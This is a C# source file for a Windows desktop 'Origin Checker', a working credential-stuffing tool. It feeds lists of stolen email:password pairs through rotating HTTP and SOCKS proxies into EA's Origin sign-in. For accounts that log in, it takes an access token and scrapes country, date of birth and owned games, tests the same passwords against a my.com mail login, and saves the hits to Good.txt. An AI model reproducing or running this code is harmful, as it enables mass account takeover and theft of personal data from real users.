using Leaf.xNet;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Windows.Threading;
using Form = System.Windows.Forms;

namespace Origin_Checker
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {

        List<string> Combo = new List<string>();
        List<string> Proxy = new List<string>();
        int Bad;
        int Good;
        int Error;
        int Remaining;
        int Checked;
        int CPM;
        int Custom;
        int seconds = 0;
        int minutes = 0;
        int hours = 0;
        double Persent;
        string ResultTime;

        public enum Type
        {
            Http,
            Socks4,
            Socks4a,
            Socks5
        }
        public Type TypeProxy = Type.Http;

        Form.NotifyIcon _ico = new Form.NotifyIcon();
        DispatcherTimer dt = new DispatcherTimer();
        Form.ContextMenu cm = new Form.ContextMenu();

        public MainWindow()
        {
            InitializeComponent();
            //=================//
            this.Closing += MainWindow_Closing;
            _ico.Click += _ico_Click;
            dt.Tick += Dt_Tick;
            dt.Interval = new TimeSpan(0, 0, 1);
        }

        private void _ico_Click(object sender, EventArgs e)
        {
            this.Topmost = true;
            this.Topmost = false;
        }

        private void MainWindow_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            _ico.Dispose();
            cm.Dispose();
            dt.Stop();
        }

        private void Grid_MouseDown(object sender, MouseButtonEventArgs e)
        {
            if (e.LeftButton == MouseButtonState.Pressed)
            {
                DragMove();
            }
        }

        private void btnKill_Click(object sender, RoutedEventArgs e)
        {
            _ico.Dispose();
            cm.Dispose();
            dt.Stop();
            Process.GetCurrentProcess().Kill();
        }

        private void btnMinimize_Click(object sender, RoutedEventArgs e)
        {
            this.WindowState = WindowState.Minimized;
        }

        private void btnRestart_Click(object sender, RoutedEventArgs e)
        {
            Application.Current.Shutdown();
            Process.Start(Environment.GetCommandLineArgs()[0]);
        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            _ico.Visible = true;
            _ico.Icon = new System.Drawing.Icon("C:/Users/mahdi/source/repos/Origin Checker/Origin Checker/Image/icon.ico");
            _ico.Text = Title;
            _ico.ContextMenu = cm;
            cm.MenuItems.Add("Open", new EventHandler(Open));
            cm.MenuItems.Add("Restart", new EventHandler(Restart));
            cm.MenuItems.Add("Creator", new EventHandler(Creator));
            cm.MenuItems.Add("Result", new EventHandler(Result));
            cm.MenuItems.Add("-");
            cm.MenuItems.Add("Exit", new EventHandler(Exit));
        }

        private void Open(object sender, EventArgs e)
        {
            this.WindowState = WindowState.Normal;
        }

        private void Restart(object sender, EventArgs e)
        {
            Application.Current.Shutdown();
            Process.Start(Environment.GetCommandLineArgs()[0]);
        }

        private void Exit(object sender, EventArgs e)
        {
            _ico.Dispose();
            cm.Dispose();
            dt.Stop();
            Process.GetCurrentProcess().Kill();
        }

        private void Creator(object sender, EventArgs e)
        {
            Process.Start("https://t.me/Ariaei_co");
        }

        private void Result(object sender, EventArgs e)
        {
            try
            {
                var prs = Process.Start("Checked in " + $"{ResultTime}");
            }
            catch
            {

            }
        }

        private void btnResult_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                var prs = Process.Start("Checked in " + $"{ResultTime}");
            }
            catch
            {

            }
        }

        private void Dt_Tick(object sender, EventArgs e)
        {
            if (seconds == 59)
            {
                seconds = 0;
                if (minutes == 59)
                {
                    minutes = 0;
                    hours++;
                }
                else
                {
                    minutes++;
                }
            }
            else
            {
                seconds++;
            }
            lblTimer.Content = (hours > 9 ? hours + "" : "0" + hours) + ":"
                + (minutes > 9 ? minutes + "" : "0" + minutes) + ":"
                + (seconds > 9 ? seconds + "" : "0" + seconds);
        }

        private void btnStart_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                if (Combo.Count == 0)
                {
                    MessageBox.Show("Please Load Combo.", "Start");
                }
                else if (Proxy.Count == 0)
                {
                    MessageBox.Show("Please Load Proxy.", "Start");
                }
                else
                {
                    if (sliderThread.Value > Combo.Count)
                    {
                        sliderThread.Value = Combo.Count;
                        lblThread.Content = "Thread: " + sliderThread.Value.ToString();
                    }
                    if(Checked == 0 && Error == 0)
                    {
                        ResultTime = $"{DateTime.Now.ToString($"{0:yyyy-MM-dd}" + "---" + $"{0:HH-mm-ss}")}";
                        Directory.CreateDirectory("Checked in " + $"{ResultTime}");
                        dt.Start();
                        new ThreadGun.ThreadGun<string>(Config, Combo, (int)sliderThread.Value,Thr_Completed,null).FillingMagazine().Start();
                    }
                }
            }
            catch
            {
                dt.Stop();
                lblTimer.Content = "00:00:00";
                minutes = 0;
                seconds = 0;
                hours = 0;
                Directory.Delete("Checked in " + $"{ResultTime}");
                MessageBox.Show("Error To Start Checking.", "Start");
            }
        }

        private void btnCombo_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                OpenFileDialog Open = new OpenFileDialog();
                Open.Filter = "Select Combo |*.txt";
                Open.Multiselect = false;
                Open.Title = "Select Combo ";
                if (Open.ShowDialog() == DialogResult == false)
                {
                    Combo.Clear();
                    StreamReader sr = new StreamReader(Open.FileName);
                    while (!sr.EndOfStream)
                    {
                        try
                        {
                            string txt = sr.ReadLine();
                            char[] Spl = { ':' };
                            string[] Comb = txt.Split(Spl);
                            string Com = Comb[1];
                            for (int i = 2; i < Comb.Length; i++)
                            {
                                Com += ":" + Comb[i];
                            }
                            Combo.Add(Comb[0] + ":" + Com);
                        }
                        catch
                        {

                        }
                    }
                    sr.Close();
                    btnCombo.Content = Combo.Count.ToString();
                }
            }
            catch
            {
                MessageBox.Show("Error To Load Combo.", "Combo");
            }
        }

        private void btnProxy_Click(object sender, RoutedEventArgs e)
        {
            if (checkboxAPI.IsChecked == false)
            {
                try
                {
                    OpenFileDialog Open = new OpenFileDialog();
                    Open.Filter = "Select Proxy |*.txt";
                    Open.Multiselect = false;
                    Open.Title = "Select Proxy ";
                    if (Open.ShowDialog() == DialogResult == false)
                    {
                        Proxy.Clear();
                        StreamReader sr = new StreamReader(Open.FileName);
                        while (!sr.EndOfStream)
                        {
                            try
                            {
                                string txt = sr.ReadLine();
                                char[] Spl = { ':' };
                                string[] Prox = txt.Split(Spl);
                                Proxy.Add(Prox[0] + ':' + Prox[1]);
                            }
                            catch
                            {

                            }
                        }
                        sr.Close();
                        btnProxy.Content = Proxy.Count.ToString();
                    }
                }
                catch
                {
                    MessageBox.Show("Error To Load Proxy.", "Proxy");
                }
            }
            else if (checkboxAPI.IsChecked == true)
            {
                try
                {
                    Leaf.xNet.HttpRequest http = new Leaf.xNet.HttpRequest();
                    var result = http.Get(textboxAPI.Text).ToString();
                    var Final = result.Split('\n');
                    Proxy.Clear();
                    Proxy.AddRange(Final);
                    btnProxy.Content = Proxy.Count.ToString();
                }
                catch
                {
                    MessageBox.Show("Error To Load Proxy.", "Proxy");
                }
            }
        }

        private void comboboxProxy_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            try
            {
                if (comboboxProxy.SelectedIndex == 0)
                {
                    TypeProxy = Type.Http;
                }
                else if (comboboxProxy.SelectedIndex == 1)
                {
                    TypeProxy = Type.Socks4;
                }
                else if (comboboxProxy.SelectedIndex == 2)
                {
                    TypeProxy = Type.Socks4a;
                }
                else
                {
                    TypeProxy = Type.Socks5;
                }
            }
            catch
            {

            }
        }

        private void checkboxAPI_Click(object sender, RoutedEventArgs e)
        {
            if (checkboxAPI.IsChecked == true)
            {
                textboxAPI.IsEnabled = true;
                textboxAPI.Clear();
            }
            else
            {
                textboxAPI.IsEnabled = false;
                textboxAPI.Text = "Proxy API:";
            }
        }

        private void sliderThread_ValueChanged(object sender, RoutedPropertyChangedEventArgs<double> e)
        {
            try
            {
                lblThread.Content = "Thread: " + sliderThread.Value.ToString();
            }
            catch
            {

            }
        }

        private void Config(string line)
        {
            string User = line.Split(':')[0];
            string Pass = line.Split(':')[1];
            for (int i = 2; i < line.Split(':').Length; i++)
            {
                Pass += ":" + line.Split(':')[i];
            }
            First:
            try
            {
                int p = new Random().Next(Proxy.Count);
                CookieStorage cook = new CookieStorage();
                using(HttpRequest Web = new HttpRequest())
                {
                    switch (TypeProxy)
                    {
                        case Type.Http:
                            Web.Proxy = HttpProxyClient.Parse(Proxy[p]);
                            break;
                        case Type.Socks4:
                            Web.Proxy = Socks4ProxyClient.Parse(Proxy[p]);
                            break;
                        case Type.Socks4a:
                            Web.Proxy = Socks4AProxyClient.Parse(Proxy[p]);
                            break;
                        case Type.Socks5:
                            Web.Proxy = Socks5ProxyClient.Parse(Proxy[p]);
                            break;
                    }
                    Web.AddHeader(HttpHeader.Accept, "*/*");
                    Web.AddHeader(HttpHeader.Pragma, "no-cache");
                    Web.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                    Web.UseCookies = true;
                    Web.Cookies = cook;
                    var resp = Web.Get("https://signin.ea.com/p/originX/login?execution=e1130480862s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fdisplay%3DoriginXWeb%252Flogin%26response_type%3Dcode%26release_type%3Dprod%26redirect_uri%3Dhttps%253A%252F%252Fwww.origin.com%252Fviews%252Flogin.html%26locale%3Den_US%26client_id%3DORIGIN_SPA_ID");
                    //================//
                    Web.AddHeader(HttpHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                    Web.AddHeader(HttpHeader.AcceptLanguage, "en-US,en;q=0.9");
                    Web.AddHeader("Sec-Fetch-Site", "same-origin");
                    Web.AddHeader("Sec-Fetch-Mode", "navigate");
                    Web.AddHeader("Sec-Fetch-User", "?1");
                    Web.AddHeader("Sec-Fetch-Dest", "document");
                    Web.Referer = "https://signin.ea.com/p/originX/login?execution=e1130480862s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fdisplay%3DoriginXWeb%252Flogin%26response_type%3Dcode%26release_type%3Dprod%26redirect_uri%3Dhttps%253A%252F%252Fwww.origin.com%252Fviews%252Flogin.html%26locale%3Den_US%26client_id%3DORIGIN_SPA_ID";
                    Web.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36";
                    Web.IgnoreProtocolErrors = true;
                    Web.AllowAutoRedirect = true;
                    Web.UseCookies = true;
                    Web.Cookies = cook;
                    var Data = Web.Post(resp.Address, $"email={User}&password={Pass}&_eventId=submit&cid=2vs4h2TvpNEUVs08ktFb5qAtUDbZlUF3&showAgeUp=true&googleCaptchaResponse=&thirdPartyCaptchaResponse=&_rememberMe=on&rememberMe=on", "application/x-www-form-urlencoded");
                    if (Data.ToString().Contains("latestSuccessLogin"))
                    {
                        string ID = Regex.Match(Data.ToString(), "fid=(.*?)\";").Groups[1].Value.ToString();
                        Web.AddHeader("Upgrade-Insecure-Requests", "1");
                        Web.Referer = "https://signin.ea.com/";
                        Web.IgnoreProtocolErrors = true;
                        Web.UseCookies = true;
                        Web.Cookies = cook;
                        Web.Get($"https://accounts.ea.com/connect/auth?display=originXWeb%2Flogin&response_type=code&release_type=prod&redirect_uri=https%3A%2F%2Fwww.origin.com%2Fviews%2Flogin.html&locale=en_US&client_id=ORIGIN_SPA_ID&fid={ID}").ToString();
                        Web.AllowAutoRedirect = true;
                        Web.IgnoreProtocolErrors = true;
                        Web.UseCookies = true;
                        Web.Cookies = cook;
                        string RE = Web.Get("https://accounts.ea.com/connect/auth?client_id=ORIGIN_JS_SDK&response_type=token&redirect_uri=nucleus:rest&prompt=none&release_type=prod").ToString();
                        if (RE.Contains("access_token"))
                        {
                            string AT = Regex.Match(RE, "{\"access_token\":\"(.*?)\",").Groups[1].Value.ToString();
                            Web.ClearAllHeaders();
                            Web.AllowAutoRedirect = true;
                            Web.IgnoreProtocolErrors = true;
                            Web.UseCookies = true;
                            Web.Cookies = cook;
                            string res = Web.Get($"https://aj-https.my.com/cgi-bin/auth?ajax_call=1&mmp=mail&simple=1&Login={User}&Password={Pass}").ToString();
                            int num = int.Parse(res.Substring(3));
                            string ok = num == 0 ? "No" : "Yes";
                            Web.AddHeader(HttpHeader.Accept, "*/*");
                            Web.AddHeader(HttpHeader.AcceptLanguage, "en-US,en;q=0.9");
                            Web.AddHeader(HttpHeader.Origin, "https://www.origin.com");
                            Web.AddHeader("X-Include-UnderAge", "true");
                            Web.AddHeader("X-Extended-Pids", "true");
                            Web.AddHeader("Sec-Fetch-Site", "cross-site");
                            Web.AddHeader("Sec-Fetch-Mode", "cors");
                            Web.AddHeader("Sec-Fetch-Dest", "empty");
                            Web.Referer = "https://www.origin.com/";
                            Web.Authorization = $"Bearer {AT}";
                            Web.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36";
                            Web.KeepAlive = true;
                            Web.AllowAutoRedirect = true;
                            Web.IgnoreProtocolErrors = true;
                            Web.UseCookies = true;
                            Web.Cookies = cook;
                            string respo = Web.Get("https://gateway.ea.com/proxy/identity/pids/me").ToString();
                            string Country = Regex.Match(respo, "\"country\" : \"(.*?)\"").Groups[1].Value.ToString();
                            string Status = Regex.Match(respo, "\"status\" : \"(.*?)\"").Groups[1].Value.ToString();
                            string MailStatus = Regex.Match(respo, "\"emailStatus\" : \"(.*?)\"").Groups[1].Value.ToString();
                            string dob = Regex.Match(respo, "\"dob\" : \"(.*?)\"").Groups[1].Value.ToString();
                            string pidID = Regex.Match(respo, "\"pidId\" : (.*?),").Groups[1].Value.ToString();
                            Web.AddHeader(HttpHeader.Accept, "application/vnd.origin.v3+json; x-cache/force-write");
                            Web.AddHeader("Sec-Fetch-Site", "same-site");
                            Web.AddHeader("AuthToken", AT);
                            Web.KeepAlive = true;
                            Web.AllowAutoRedirect = true;
                            Web.IgnoreProtocolErrors = true;
                            Web.UseCookies = true;
                            Web.Cookies = cook;
                            string respon = Web.Get($"https://api1.origin.com/ecommerce2/consolidatedentitlements/{pidID}?machine_hash=1").ToString();
                            if (respon.Contains("offerPath"))
                            {
                                Match ga = Regex.Match(respon, "\"offerPath\" : \"/(.*?)\"");
                                string Game = ga.Groups[1].Value.ToString() + Environment.NewLine;
                                int sp = respon.Split('{').Length;
                                for (int h = 1; h < sp - 2; h++)
                                {
                                    ga = ga.NextMatch();
                                    Game += ga.Groups[1].Value.ToString() + Environment.NewLine;
                                }
                                Good++;
                                Checked++;
                                Remaining = Combo.Count - Checked;
                                lblGood.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblGood.Content = "Good: " + Good.ToString(); }));
                                lblChecked.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblChecked.Content = "Checked: " + Checked.ToString(); }));
                                lblRemaining.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblRemaining.Content = "Remaining: " + Remaining.ToString(); }));
                                Persent = (((double)Checked / Combo.Count) * 100);
                                lblPersent.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblPersent.Content = "Total: " + Persent.ToString("F3") + "%"; }));
                                if (minutes == 0)
                                {
                                    CPM = Checked;
                                }
                                else if (hours == 0)
                                {
                                    CPM = ((Checked * 100) / ((minutes * 100) + (seconds * 100 / 60)));
                                }
                                else
                                {
                                    CPM = ((Checked * 100) / ((((hours * 60) * 100) + (minutes * 100)) + (seconds * 100 / 60)));
                                }
                                lblCPM.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblCPM.Content = "CPM: " + CPM.ToString(); }));
                                textboxLog.Dispatcher.Invoke(new Form.MethodInvoker(delegate { textboxLog.Text += $"-----------------Start-----------------\nUsername: {User}\nPassword: {Pass}\n{User}:{Pass}\n--------Capture---------\nCountry: {Country}\nMail Access: {ok}\nStatus: {Status}\nMail Status: {MailStatus}\nDOB: {dob}\nGames:\n{Game}\n-----------------End-----------------\n\n"; }));
                                StreamWriter sw = new StreamWriter("Checked in " + $"{ResultTime}\\Good.txt", true);
                                sw.WriteLine($"-----------------Start-----------------\nUsername: {User}\nPassword: {Pass}\n{User}:{Pass}\n--------Capture---------\nCountry: {Country}\nMail Access: {ok}\nStatus: {Status}\nMail Status: {MailStatus}\nDOB: {dob}\nGames:\n{Game}\n-----------------End-----------------\n\n");
                                sw.Close();
                            }
                            else
                            {
                                Custom++;
                                Checked++;
                                lblCustom.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblCustom.Content = "Custom: " + Custom.ToString(); }));
                                lblChecked.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblChecked.Content = "Checked: " + Checked.ToString(); }));
                                Remaining = Combo.Count - Checked;
                                lblRemaining.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblRemaining.Content = "Remaining: " + Remaining.ToString(); }));
                                Persent = (((double)Checked / Combo.Count) * 100);
                                lblPersent.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblPersent.Content = "Total: " + Persent.ToString("F3") + "%"; }));
                                if (minutes == 0)
                                {
                                    CPM = Checked;
                                }
                                else if (hours == 0)
                                {
                                    CPM = ((Checked * 100) / ((minutes * 100) + (seconds * 100 / 60)));
                                }
                                else
                                {
                                    CPM = ((Checked * 100) / ((((hours * 60) * 100) + (minutes * 100)) + (seconds * 100 / 60)));
                                }
                                lblCPM.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblCPM.Content = "CPM: " + CPM.ToString(); }));
                                StreamWriter sw1 = new StreamWriter("Checked in " + $"{ResultTime}\\Custom.txt", true);
                                sw1.WriteLine($"{User}:{Pass}");
                                sw1.Close();
                            }
                        }
                        else
                        {
                            Error++;
                            lblError.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblError.Content = "Error: " + Error.ToString(); }));
                            Thread.Sleep(1000);
                            goto First;
                        }
                    }
                    else if (Data.ToString().Contains("Your credentials are incorrect or have expired"))
                    {
                        Bad++;
                        Checked++;
                        lblBad.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblBad.Content = "Bad: " + Bad.ToString(); }));
                        lblChecked.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblChecked.Content = "Checked: " + Checked.ToString(); }));
                        Remaining = Combo.Count - Checked;
                        lblRemaining.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblRemaining.Content = "Remaining: " + Remaining.ToString(); }));
                        Persent = (((double)Checked / Combo.Count) * 100);
                        lblPersent.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblPersent.Content = "Total: " + Persent.ToString("F3") + "%"; }));
                        if (minutes == 0)
                        {
                            CPM = Checked;
                        }
                        else if (hours == 0)
                        {
                            CPM = ((Checked * 100) / ((minutes * 100) + (seconds * 100 / 60)));
                        }
                        else
                        {
                            CPM = ((Checked * 100) / ((((hours * 60) * 100) + (minutes * 100)) + (seconds * 100 / 60)));
                        }
                        lblCPM.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblCPM.Content = "CPM: " + CPM.ToString(); }));
                        StreamWriter sw = new StreamWriter("Checked in " + $"{ResultTime}\\Bad.txt", true);
                        sw.WriteLine($"{User}:{Pass}");
                        sw.Close();
                    }
                    else if (Data.ToString().Contains("Your account has been disabled"))
                    {
                        Custom++;
                        Checked++;
                        lblCustom.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblCustom.Content = "Custom: " + Custom.ToString(); }));
                        lblChecked.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblChecked.Content = "Checked: " + Checked.ToString(); }));
                        Remaining = Combo.Count - Checked;
                        lblRemaining.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblRemaining.Content = "Remaining: " + Remaining.ToString(); }));
                        Persent = (((double)Checked / Combo.Count) * 100);
                        lblPersent.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblPersent.Content = "Total: " + Persent.ToString("F3") + "%"; }));
                        if (minutes == 0)
                        {
                            CPM = Checked;
                        }
                        else if (hours == 0)
                        {
                            CPM = ((Checked * 100) / ((minutes * 100) + (seconds * 100 / 60)));
                        }
                        else
                        {
                            CPM = ((Checked * 100) / ((((hours * 60) * 100) + (minutes * 100)) + (seconds * 100 / 60)));
                        }
                        lblCPM.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblCPM.Content = "CPM: " + CPM.ToString(); }));
                        StreamWriter sw = new StreamWriter("Checked in " + $"{ResultTime}\\Custom.txt", true);
                        sw.WriteLine($"{User}:{Pass}");
                        sw.Close();
                    }
                    else
                    {
                        Error++;
                        lblError.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblError.Content = "Error: " + Error.ToString(); }));
                        Thread.Sleep(1000);
                        goto First;
                    }
                }
            }
            catch
            {
                Error++;
                lblError.Dispatcher.Invoke(new Form.MethodInvoker(delegate { lblError.Content = "Error: " + Error.ToString(); }));
                Thread.Sleep(1000);
                goto First;
            }
        }

        private void Thr_Completed(IEnumerable<string> inputs)
        {
            dt.Stop();
            MessageBox.Show("Check Was Completed.", "Complet");
        }
    }
}
